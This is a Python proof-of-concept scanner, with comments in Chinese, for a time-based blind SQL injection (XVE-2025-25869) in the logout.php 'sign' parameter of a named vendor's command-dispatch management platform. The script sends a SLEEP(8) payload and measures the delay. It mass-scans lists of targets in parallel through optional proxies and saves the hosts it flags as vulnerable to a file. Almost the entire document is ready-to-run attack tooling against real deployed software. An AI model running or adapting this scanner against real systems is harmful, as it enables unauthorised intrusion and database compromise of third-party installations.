#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import urllib3
import sys
import os
import time
from multiprocessing import Pool

# 忽略SSL证书警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局代理变量
PROXIES = None

BANNER = r"""
   ██╗    ██╗███████╗██╗ ██████╗██╗  ██╗ █████╗  ██████╗ 
   ██║    ██║██╔════╝██║██╔════╝██║  ██║██╔══██╗██╔═══██╗
   ██║ █╗ ██║█████╗  ██║██║     ███████║███████║██║   ██║
   ██║███╗██║██╔══╝  ██║██║     ██╔══██║██╔══██║██║   ██║
   ╚███╔███╔╝███████╗██║╚██████╗██║  ██║██║  ██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                                   
          Author: weichao (围巢)
          Version: 1.0
          Description: 某某科立讯通信 指挥调度管理平台 logout.php SQL注入 POC
          漏洞类型: 时间盲注 (Time-based Blind SQL Injection)
"""


def check_vulnerability(url):
    """
    检测单个URL是否存在SQL注入漏洞
    漏洞接口: /custom/zx/logout.php
    注入参数: sign (GET)
    """
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # 构造时间盲注Payload (SLEEP 8秒)
    # 原始payload: sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)&
    api_path = "/custom/zx/logout.php"
    target_url = url.rstrip('/') + api_path

    # 正常请求（基线）
    normal_params = {"sign": "1"}
    # 注入请求（带sleep）
    sleep_params = {"sign": "1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)&"}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
    }

    try:
        # 1. 发送正常请求，测量基线响应时间
        start_normal = time.time()
        resp_normal = requests.get(
            target_url,
            params=normal_params,
            headers=headers,
            proxies=PROXIES,
            timeout=15,
            verify=False,
            allow_redirects=False
        )
        normal_time = time.time() - start_normal

        # 2. 发送注入请求，测量响应时间
        start_sleep = time.time()
        resp_sleep = requests.get(
            target_url,
            params=sleep_params,
            headers=headers,
            proxies=PROXIES,
            timeout=15,
            verify=False,
            allow_redirects=False
        )
        sleep_time = time.time() - start_sleep

        # 3. 判断：如果sleep请求比正常请求慢5秒以上，认为存在漏洞
        time_diff = sleep_time - normal_time
        if time_diff > 5:
            print(f"[+] {target_url} 存在漏洞 (正常: {normal_time:.2f}s, 注入: {sleep_time:.2f}s, 延迟: {time_diff:.2f}s)")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{target_url}\n")
            return True
        else:
            print(f"[-] {target_url} 不存在漏洞 (正常: {normal_time:.2f}s, 注入: {sleep_time:.2f}s, 延迟: {time_diff:.2f}s)")
            return False

    except requests.exceptions.Timeout:
        # 如果注入请求超时（超过15秒），说明sleep可能执行成功
        print(f"[+] {target_url} 可能存在漏洞 (请求超时，SLEEP执行)")
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(f"{target_url}\n")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求 {target_url} 时发生错误: {e}")
        return None


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="福建科立讯通信 指挥调度管理平台 logout.php SQL注入检测POC (XVE-2025-25869)"
    )
    parser.add_argument('-u', '--url', type=str, help='单个URL检测 (例如: http://192.168.1.100)')
    parser.add_argument('-f', '--file', type=str, help='批量检测文件 (每行一个URL)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发进程数 (默认10)')
    parser.add_argument('--proxy', type=str, help='代理地址 (例如: http://127.0.0.1:7890)')
    parser.add_argument('--sleep', type=int, default=8, help='SLEEP秒数 (默认8)')
    args = parser.parse_args()

    # 设置全局代理
    global PROXIES
    if args.proxy:
        PROXIES = {
            "http": args.proxy,
            "https": args.proxy
        }

    # 单URL检测
    if args.url:
        check_vulnerability(args.url)
        return

    # 批量检测
    if args.file:
        if not os.path.exists(args.file):
            print(f"错误: 文件 '{args.file}' 不存在")
            sys.exit(1)

        with open(args.file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]

        if not urls:
            print("文件中没有有效的URL")
            sys.exit(1)

        print(f"开始批量检测，共 {len(urls)} 个目标，并发进程数: {args.threads}")
        with Pool(processes=args.threads) as pool:
            pool.map(check_vulnerability, urls)

        print("\n扫描完成！存在漏洞的URL已保存至 result.txt")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()